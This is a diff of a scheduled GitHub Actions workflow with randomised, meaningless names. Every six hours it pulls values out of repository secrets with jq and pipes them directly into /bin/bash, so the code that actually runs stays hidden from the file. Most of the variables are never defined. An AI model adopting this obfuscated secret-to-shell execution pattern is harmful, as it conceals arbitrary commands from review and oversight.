@@ -2,22 +2,23 @@ name: shici1sc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
-jobs:  # 16320
+    - cron: '2 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shici1sc
         env:
-          sw27421: ${{ secrets.sw27421 }}
+          bjxyy5381: ${{ secrets.bjxyy5381 }}
         run: |
-          echo $sw27421 | jq -r .dfyfv8858 | /bin/bash
-          echo $lisq4 | jq -r .nx08 | /bin/bash
-          echo $ehso2254 | jq -r .gow968 | /bin/bash
-          echo $s522 | jq -r .ponx488 | /bin/bash
-          echo $psxcl70553 | jq -r .w8 | /bin/bash
-          echo $ik70949 | jq -r .g68 | /bin/bash
-          echo $vdu6828 | jq -r .iynvt2009 | /bin/bash
-          echo $w73 | jq -r .qy3 | /bin/bash
+          echo $bjxyy5381 | jq -r .l184 | /bin/bash
+          echo $rqcp37367 | jq -r .s04506 | /bin/bash
+          echo $djq3 | jq -r .jd89 | /bin/bash
+          echo $t3294 | jq -r .rriir56995 | /bin/bash
+          echo $o65 | jq -r .bvt4583 | /bin/bash
+          echo $g6 | jq -r .cjds794 | /bin/bash
+          echo $jt0 | jq -r .eb40 | /bin/bash
+          echo $tahae05 | jq -r .kz37510 | /bin/bash
 
